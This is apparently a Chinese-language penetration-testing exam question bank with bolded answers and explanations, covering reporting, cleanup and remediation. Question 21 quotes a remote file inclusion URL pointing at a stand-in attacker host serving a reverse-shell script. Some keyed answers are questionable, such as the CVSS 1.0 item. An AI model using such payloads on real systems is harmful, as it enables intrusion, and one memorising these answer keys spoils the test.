
## 渗透测试场景题

### 1. CVSS 1.0 漏洞利用难度
你是一名渗透测试员，刚完成对新客户的测试。一份详细的渗透测试报告已交付给安全分析师。渗透测试针对客户的 DMZ 环境进行。报告中有一项发现，其通用漏洞评分系统（CVSS）基础分为 1.0。利用此漏洞需要哪种难度级别？

1.  非常困难，因为外围系统通常位于防火墙之后
2.  有点困难，因为利用它需要强大的处理能力
3.  **微不足道，因为利用该发现只需很少的工作量**
4.  不可能，因为外部主机已加固以防范攻击

### 2. 风险等级在报告中的位置
你是一名渗透测试员，正在为新客户规划测试。你正在撰写一份概述对运营总体风险等级的报告。应在报告的哪个部分包含此信息？

1.  附录
2.  **执行摘要**
3.  主体
4.  技术摘要

### 3. 关键漏洞的首要响应措施
你是一名安全分析师，正在审查针对内网服务执行的最近一次内部漏洞扫描结果。扫描报告显示存在一个关键漏洞。报告内容如下：

*   **标题**：Web 服务器远程命令执行漏洞
*   **评级**：严重（CVSS 10.0）
*   **威胁行为者**：Web 服务器的任何远程用户
*   **置信度**：确定
*   **建议**：应用供应商补丁

你首先应该做什么？

1.  应用风险评级及其对组织的影响。
2.  利用该服务器以确定扫描是否报告了误报。
3.  向高级管理层通报该漏洞。
4.  **安排关键的带外修补。**

### 4. 测试细节与结果的报告章节
你是一名渗透测试员，刚完成对新客户的测试。你正在创建测试后的书面发现报告。在报告的哪个部分应向读者提供所执行测试及发现结果的深度大纲？

1.  执行摘要部分
2.  **发现与修复部分**
3.  方法论部分
4.  指标与度量部分

### 5. 建议列表的报告章节
你是一名渗透测试员，刚完成对新客户的测试。你正在创建测试后的书面发现报告。根据测试结果，你列出了一份建议清单，认为客户应重点关注。应在报告的哪个部分放置这些建议？

1.  结论部分
2.  执行摘要部分
3.  **发现与修复部分**
4.  方法论部分

### 6. 交付后清理阶段的活动
你是一名渗透测试员，刚完成对新客户的测试。你正在进行交付后清理。交付后清理阶段执行哪些活动？（选择三项。）

1.  修复漏洞
2.  **移除所用的任何工具**
3.  **移除 Shell**
4.  **移除测试员创建的凭据**

### 7. 缺少数据擦除工具的问题复盘阶段
你是一名渗透测试员，刚完成对新客户的测试。测试后清理时发现客户没有必要的数据擦除工具。随后将所需工具分发给了需要的技术人员。应在哪个阶段重新审视此问题？

1.  **经验教训阶段**
2.  缓解阶段
3.  准备阶段
4.  报告阶段

### 8. 确保交付后清理顺利进行的做法
你是一名渗透测试员，正在为新客户进行测试。测试即将完成，你希望确保交付后清理过程没有问题。在整个测试阶段应该怎么做，以确保交付后工作轻松进行？

1.  你应该创建后门以便稍后访问。
2.  **你应该仔细记录测试期间所做的一切。**
3.  你应该擦除利用过程中创建的任何日志条目。
4.  你应该为所有系统和设备创建镜像，以便将它们恢复到测试前的状态。

### 9. 交付后清理过程中的操作
你是一名渗透测试员，刚完成对新客户的测试。你正在进行交付后清理过程。在交付后清理过程中应该做什么？（选择两项。）

1.  **确保移除测试期间创建的任何 Shell 会话。**
2.  确保向客户隐藏测试期间所做的一切。
3.  **确保记录测试期间所做的一切。**
4.  确保隐藏测试后清理期间所做的一切。

### 10. 履行合同责任的证明文件
你是一名渗透测试员，刚完成对新客户的测试。你正在与客户会面讨论渗透测试。会议结束时，你要求客户签署一份协议，声明你已根据合同履行了职责。这叫什么？

1.  发现证明
2.  **客户验收**
3.  后续行动/重测
4.  经验教训

### 11. 合规性证明文件
你是一名渗透测试员，刚完成对新客户的测试。你正在与客户会面讨论渗透测试。会议期间，你向客户提供一份文件，声明你已进行测试，且客户符合其政府合同之一规定的规则和法规。这叫什么？

1.  **发现证明**
2.  客户验收
3.  后续行动/重测
4.  经验教训

### 12. 初级技术人员发现严重漏洞的上报方式
某组织 IT 部门的一名初级技术人员对企业 Web 应用程序运行渗透测试。测试期间，技术人员发现该应用程序可泄露一个包含所有企业用户帐户和密码信息的 SQL 表。初级技术人员应如何通知高层管理人员？

1.  技术人员应使用此信息连接到 SQL 服务器，并更改一些非关键帐户的密码，以向管理层演示概念验证。
2.  **技术人员应使用执行摘要记录发现，包括建议和屏幕截图，并提供给管理层。**
3.  技术人员应通知开发团队这一发现，并建议在 Web 应用程序的 SQL 查询字符串上强制执行输入验证。
4.  技术人员应要求管理层创建提案请求（RFP），以开始与专业渗透测试公司的正式合作。

### 13. 邮件内容过滤属于哪类补救活动
你和同事正在讨论某组织实施电子邮件内容过滤的场景，以阻止看似来自内部来源但未经过适当身份验证的入站消息。他们还可能过滤掉任何包含高风险关键字或似乎来自已知恶意来源的消息。这种常见的补救活动类别属于哪一类？

1.  度量
2.  人员
3.  流程
4.  **技术**

### 14. 多因素认证的示例
你和同事正在讨论多因素认证。同事请你举一个多因素认证的例子。你会告诉同事什么？

1.  多因素认证是使用生物特征指纹和语音识别
2.  **多因素认证是使用智能卡和 PIN 码**
3.  多因素认证是使用视网膜扫描和语音识别
4.  多因素认证是使用用户名、PIN 码和员工 ID 号

### 15. 多因素认证类别
你和同事正在讨论不同的多因素认证类别。例如：员工使用带有认证令牌的钥匙扣，该令牌生成一次性密码，必须在登录时使用。此场景属于哪种多因素认证类别？

1.  Something you are（生物特征）
2.  **Something you have（拥有因素）**
3.  Something you know（知识因素）
4.  Something you need（需求因素）

> **解析**：钥匙扣和令牌属于用户持有的物理设备，属于“拥有因素”。

---

### 16. 公共 Web 服务器高位端口监听
你是一名渗透测试人员，正在为新客户进行测试。你注意到公共 Web 服务器上有多个高位端口处于监听状态。客户表示他们仅使用端口 443 运行应用程序。你应该向客户提出什么建议？

1.  **That they disable the unneeded services（禁用不需要的服务）**
2.  That they filter port 443 to specific IP addresses（将端口 443 过滤至特定 IP 地址）
3.  That they implement a web application firewall（实施 Web 应用防火墙）
4.  That they transition the application to another port（将应用程序迁移至其他端口）

> **解析**：减少攻击面的最佳实践是关闭不必要的服务/端口。

---

### 17. SQL 注入漏洞缓解
你是一名渗透测试人员，正在为新客户进行测试。你成功在文本框中输入 SQL 注入命令并访问了数据库中存储的信息。你应该建议客户采取什么措施来缓解该漏洞？

1.  **That they implement input normalization（实施输入规范化/验证）**
2.  That they install host-based intrusion detection（安装基于主机的入侵检测）
3.  That they perform system hardening（执行系统加固）
4.  That they randomize the credentials used to log in（随机化登录凭据）

> **解析**：SQL 注入的核心防御是输入验证、参数化查询或输入规范化。

---

### 18. 多协议漏洞利用导致服务器沦陷
你是一名渗透测试人员，正在为新客户进行测试。客户要求你测试多台 Web 服务器的安全性。你通过利用 DNS、FTP、IMAP、POP、SMTP 和 Telnet 相关的漏洞，在多台服务器上获得了 root/管理员访问权限。你应该建议客户如何更好地保护其 Web 服务器？

1.  **They should disable any unnecessary services.（禁用任何不必要的服务。）**
2.  They should increase application event logging.（增加应用程序事件日志记录。）
3.  They should use a honeypot.（使用蜜罐。）
4.  They should use Transport Layer Security (TLS).（使用传输层安全性 (TLS)。）

> **解析**：服务器运行了过多不必要的网络服务（FTP、Telnet 等），应遵循最小化原则禁用非业务必需服务。

---

### 19. 本地管理员密码重用问题
你是一名渗透测试人员，刚完成新客户的测试。在回顾结果时，你发现客户在所有系统上使用相同的本地管理员密码。可以使用什么工具来帮助解决此问题？

1.  **Local Administrator Password Solution (LAPS)**
2.  Limited Administrator Password Assistance (LAPA)
3.  Nessus
4.  Metasploit

> **解析**：`LAPS` 是微软提供的解决方案，用于自动管理并定期轮换每台机器唯一的本地管理员密码。

---

### 20. 横向移动缓解策略
你是一名渗透测试人员，正在为新客户进行测试。测试期间，你攻破了一台工作站，随后在域内几乎无阻碍地横向移动。你应该在报告中推荐哪些缓解策略？（选择三项。）

1.  That they apply additional network access control（应用额外的网络访问控制）
2.  That for all logons, they require multifactor authentication（所有登录要求多因素认证）
3.  **That for each machine, they randomize local administrator credentials（为每台机器随机化本地管理员凭据）**
4.  **That for local administrators, they disable remote logons（禁用本地管理员的远程登录）**
5.  That they increase the minimum password complexity requirements（增加最低密码复杂度要求）
6.  That they put each host into its own virtual local area network (VLAN)（将每台主机放入各自的 VLAN）
7.  That on every workstation, they enable full-disk encryption（在每台工作站上启用全盘加密）

> **解析**：针对利用相同本地管理员密码进行横向移动的核心对策是：`LAPS` 随机化密码（3）、禁用本地管理员远程登录（4）、网络分段/访问控制限制横向连接（1 或 6）。标准答案通常为 1, 3, 4。

---

### 21. 远程文件包含 (RFI) 攻击修复
你是一名渗透测试人员，正在为新客户进行测试。你正在监控 Web 应用防火墙 (`WAF`) 日志，发现针对以下 URL 的攻击成功：

`https://sample.com/index.php?Phone=http://iattackedyou.com/stuffhappens/revshell.php`

为防止此类攻击再次发生，应采取什么修复措施？

1.  Block URL redirections.（阻止 URL 重定向。）
2.  Double URL encode the parameters.（对参数进行双重 URL 编码。）
3.  **From the application, stop external calls.（从应用程序层面停止外部调用。）**
4.  Implement a blacklist.（实施黑名单。）

> **解析**：这是典型的远程文件包含 (`RFI`) 攻击。根本修复是代码层面禁止动态包含外部资源（禁用 `allow_url_include` 等），即停止外部调用。

---

### 22. 钓鱼获取凭据及哈希破解修复
你是一名渗透测试人员，正在为新客户进行测试。在尝试钓鱼攻击时，你从 IT 部门成员处获取了初始 VPN 用户域凭据。随后通过 VPN 获取哈希并利用字典攻击轻松破解。你应该向客户推荐什么修复措施？（选择三项。）

1.  **Recommend increased password complexity requirements.（建议增加密码复杂度要求。）**
2.  **Recommend implementing two-factor authentication for remote access.（建议为远程访问实施双因素认证。）**
3.  Recommend installing an intrusion prevention system.（建议安装入侵防御系统。）
4.  Recommend installing a security information event monitoring solution.（建议安装安全信息事件监控解决方案。）
5.  Recommend preventing members of the IT department from interactively logging in as administrators.（建议阻止 IT 部门成员以管理员身份交互式登录。）
6.  **Recommend requiring that all employees take security awareness training.（建议要求所有员工接受安全意识培训。）**
7.  Recommend upgrading the cipher suite used for the VPN solution.（建议升级 VPN 解决方案使用的密码套件。）

> **解析**：
> - 钓鱼成功 -> 安全意识培训 (6)。
> - 密码被字典破解 -> 增加复杂度 (1)。
> - VPN 仅凭密码登录 -> 启用 MFA/2FA (2)。

---

### 23. 仅使用基础认证的互联网应用修复
你是一名渗透测试人员，正在为新客户进行测试。完成面向互联网应用程序的测试后，你发现该应用程序仅使用基础认证。你应该向客户推荐的最佳修复策略是什么？

1.  That they enable HTTP Strict Transport Security (HSTS)（启用 HTTP 严格传输安全 (HSTS)）
2.  That they enable a secure cookie flag（启用安全 Cookie 标志）
3.  **That they encrypt the communication channel（加密通信通道）** / 迁移至现代认证机制（如 OAuth, 基于表单的认证配合 HTTPS）
4.  That they sanitize invalid user input（清理无效用户输入）

> **解析**：基础认证 (`Basic Auth`) 仅将凭据 Base64 编码传输，极不安全。首要对策是强制使用 HTTPS 加密通道，防止凭据窃听。选项 3 最直接针对“明文传输”这一核心缺陷。

---

### 24. 渗透测试中必须与客户沟通的情况
你是一名渗透测试人员，正在为新客户进行测试。测试过程中，你需要与客户沟通。以下哪种情况会导致这种沟通发生？（选择两项。）

1.  **Following an attempted test, the system becomes unavailable.（测试尝试后，系统变得不可用。）**
2.  **The system shows an indication of prior unauthorized access.（系统显示先前未经授权访问的迹象。）**
3.  The system shows a lack of complete hardening.（系统显示缺乏完整的加固。）
4.  The tester discovered individually identifiable data on the system.（测试人员在系统上发现可识别个人身份的数据。）
5.  The tester discovers something that is on an out-of-scope system.（测试人员发现超出范围系统上的内容。）

> **解析**：
> - (1) 造成拒绝服务，必须立即汇报。
> - (2) 发现活跃入侵或历史入侵痕迹，属于紧急发现，必须立即汇报。
> - (3)(4)(5) 属于常规发现，写入最终报告即可，通常不要求中途紧急沟通（除非合同特别约定）。

---

### 25. 预算有限时的漏洞修复优先级
你是一名渗透测试人员，刚完成新客户的测试。报告列出了共 9 个漏洞，其中 4 个被判定为严重。客户预算不足，无法立即修复所有漏洞。在该情况下，你建议客户的最佳选项是什么？
